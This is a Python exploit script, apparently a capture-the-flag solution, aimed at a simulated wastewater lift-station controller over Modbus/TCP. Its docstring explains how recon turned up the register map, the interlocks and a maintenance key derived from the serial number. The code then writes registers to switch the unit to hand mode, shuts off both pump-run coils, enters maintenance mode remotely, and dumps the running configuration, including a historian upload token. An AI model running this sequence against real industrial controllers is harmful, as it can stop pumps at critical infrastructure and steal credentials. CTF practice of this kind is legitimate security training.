#!/usr/bin/env python3
"""
WWLS-07 Modbus/TCP exploit - lift station controller config dump.

Target: raw Modbus/TCP, 212.2.248.156:32721 (challenge's "nc" endpoint;
the TCP 16330 / WWLS-07 naming in the prompt is in-fiction flavor text).

Vendor claims the RTU's running config (incl. historian upload credentials)
can only be dumped by a technician on-site with the panel in maintenance.
In reality the "maintenance mode" state machine is fully reachable over the
network with no authentication beyond a static, publicly-readable key.

Recon steps that led here (see .agents/tasks/task-modbus-wwls07/*.py):
  1. Standard Modbus function codes 1-6, 0x0F, 0x10, 0x11, 0x2B are
     implemented; everything else returns ILLEGAL FUNCTION (exception 01).
  2. Read Device Identification (fc 0x2B, MEI 0x0E), category 3 (extended),
     exposes two vendor objects beyond the standard 0-6 set:
       obj 0x80: unit serial number "BMK-LS4-2208-01937"
       obj 0x81: "regmap: input regs 30257+"
  3. Input registers starting at 30257 (protocol addr 256, fc 0x04) contain
     an ASCII register-map document describing the whole address space,
     including a SERVICE block:
       40017 MAINT_KEY (write-only) = CRC-16/MODBUS of the serial number
             (device ID object 0x80)
       40018 SVC_CMD, 40019 SVC_ARG, 40020 SVC_STATUS
       SVC_CMD 0x0001 LAMP_TEST, 0x0002 CLR_FAULT, 0x0D5C DUMP_CFG(ARG=PAGE)
       coil 00009 = MAINT_REQ (sets physical "maintenance" mode remotely)
       dump window: holding regs 40513-40636 = PAGE, PAGES, NBYTES, CRC16,
             then 120 words of ASCII config data, each word byte-swapped
             (low byte = first character), NUL padded.
  4. Writing coil 9 (MAINT_REQ) directly failed with Modbus exception 04
     until two interlocks were satisfied, discovered by reading
     LAST_FAULT/FAULT_TXT (input regs 30011-30027) after each failed
     attempt:
       INTLK 21: MAINT NEEDS HAND MODE   -> write holding reg 40001 = 1
       INTLK 22: PUMP 1 RUNNING          -> clear coils 1 and 2 (P1_RUN/P2_RUN)
       INTLK 24: MAINT KEY INVALID       -> write the correct CRC16 key to
                                            40017 *before* setting the coil
  5. Once MAINT_REQ is accepted (fault text reads "MAINT ACTIVE"), SVC_CMD
     0x0D5C (DUMP_CFG) stops returning exception 04 and starts returning
     the running configuration via the dump window, page by page.

Flag found in the dumped config:
  historian.upload.token=ctf7{h4nd_m0d3_m41nt_k3y_dump_th3_pl4nt_31796b36}
"""
import socket
import struct

HOST = "212.2.248.156"
PORT = 32721
SERIAL = b"BMK-LS4-2208-01937"  # Device ID object 0x80


def crc16_modbus(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA001
            else:
                crc >>= 1
    return crc


class ModbusClient:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.settimeout(5)
        self.tid = 1

    def _req(self, pdu, unit_id=1):
        mbap = struct.pack(">HHHB", self.tid, 0, len(pdu) + 1, unit_id)
        self.sock.sendall(mbap + pdu)
        self.tid += 1
        resp = self.sock.recv(8192)
        # strip MBAP header, return raw PDU
        return resp[7:]

    def read_coils(self, addr_1based, qty):
        addr = addr_1based - 1
        return self._req(bytes([0x01]) + struct.pack(">HH", addr, qty))

    def write_coil(self, addr_1based, on):
        addr = addr_1based - 1
        val = 0xFF00 if on else 0x0000
        return self._req(bytes([0x05]) + struct.pack(">HH", addr, val))

    def read_holding(self, addr_1based, qty):
        addr = addr_1based - 40001
        return self._req(bytes([0x03]) + struct.pack(">HH", addr, qty))

    def write_holding(self, addr_1based, value):
        addr = addr_1based - 40001
        return self._req(bytes([0x06]) + struct.pack(">HH", addr, value))

    def read_input(self, addr_1based, qty):
        addr = addr_1based - 30001
        return self._req(bytes([0x04]) + struct.pack(">HH", addr, qty))

    def close(self):
        self.sock.close()


def dump_page(mb, key, page):
    mb.write_holding(40019, page)   # SVC_ARG = page number
    mb.write_holding(40017, key)    # MAINT_KEY (write-only, re-send each time)
    mb.write_holding(40018, 0x0D5C)  # SVC_CMD = DUMP_CFG
    resp = mb.read_holding(40513, 124)
    if resp[0] != 0x03:
        raise RuntimeError(f"dump read failed: {resp.hex()}")
    nbytes_hdr = resp[1]
    data = resp[2:2 + nbytes_hdr]
    page_num, pages, nbytes, crc = struct.unpack(">HHHH", data[:8])
    words = data[8:8 + 240]
    chars = bytearray()
    for i in range(0, len(words), 2):
        hi, lo = words[i], words[i + 1]
        chars.append(lo)
        chars.append(hi)
    return page_num, pages, bytes(chars[:nbytes])


def main():
    mb = ModbusClient(HOST, PORT)
    key = crc16_modbus(SERIAL)

    # Satisfy maintenance interlocks discovered via FAULT_TXT:
    mb.write_holding(40001, 1)      # MODE = HAND
    mb.write_coil(1, False)         # P1_RUN off
    mb.write_coil(2, False)         # P2_RUN off
    mb.write_holding(40017, key)    # MAINT_KEY = CRC16/MODBUS(serial)
    mb.write_coil(9, True)          # MAINT_REQ -> enters maintenance mode

    page_num, pages, text = dump_page(mb, key, 1)
    full = text
    for p in range(2, pages + 1):
        _, _, t = dump_page(mb, key, p)
        full += t

    mb.close()

    config = full.decode("ascii", errors="replace")
    print(config)

    for line in config.splitlines():
        if line.startswith("historian.upload.token="):
            print("\nFLAG:", line.split("=", 1)[1])


if __name__ == "__main__":
    main()
